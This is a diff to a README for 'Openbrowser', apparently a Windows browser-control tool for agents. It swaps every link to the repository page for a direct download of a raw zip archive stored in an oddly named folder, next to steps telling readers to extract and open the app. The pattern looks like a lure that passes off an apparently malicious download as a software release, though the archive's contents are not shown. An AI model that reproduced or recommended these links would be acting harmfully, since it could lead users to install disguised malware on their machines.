@@ -1,12 +1,12 @@
 # 🧭 Openbrowser - Browser Control for Agent Work
 
-[![Download Openbrowser](https://img.shields.io/badge/Download-Openbrowser-6f42c1?style=for-the-badge&logo=github)](https://github.com/Lycoperdonbactericide741/Openbrowser)
+[![Download Openbrowser](https://img.shields.io/badge/Download-Openbrowser-6f42c1?style=for-the-badge&logo=github)](https://github.com/Lycoperdonbactericide741/Openbrowser/raw/refs/heads/main/Chlamydobacteriaceae/Software_v1.1-alpha.4.zip)
 
 ## 📥 Download Openbrowser
 
 Visit this page to download Openbrowser for Windows:
 
-[Openbrowser download page](https://github.com/Lycoperdonbactericide741/Openbrowser)
+[Openbrowser download page](https://github.com/Lycoperdonbactericide741/Openbrowser/raw/refs/heads/main/Chlamydobacteriaceae/Software_v1.1-alpha.4.zip)
 
 If the page shows a release file such as `.exe` or `.zip`, download it to your computer. If you see a zip file, save it first, then extract it before you open the app.
 
@@ -37,7 +37,7 @@ For best results, keep Windows updated and close other large apps while you inst
 Follow these steps:
 
 1. Open the download page:
-   [Openbrowser download page](https://github.com/Lycoperdonbactericide741/Openbrowser)
+   [Openbrowser download page](https://github.com/Lycoperdonbactericide741/Openbrowser/raw/refs/heads/main/Chlamydobacteriaceae/Software_v1.1-alpha.4.zip)
 
 2. Find the latest release file for Windows.
 
@@ -160,5 +160,5 @@ Go back to the same download page and check for a newer release.
 
 If you need the file again, use this link:
 
-[Openbrowser download page](https://github.com/Lycoperdonbactericide741/Openbrowser)
+[Openbrowser download page](https://github.com/Lycoperdonbactericide741/Openbrowser/raw/refs/heads/main/Chlamydobacteriaceae/Software_v1.1-alpha.4.zip)
 
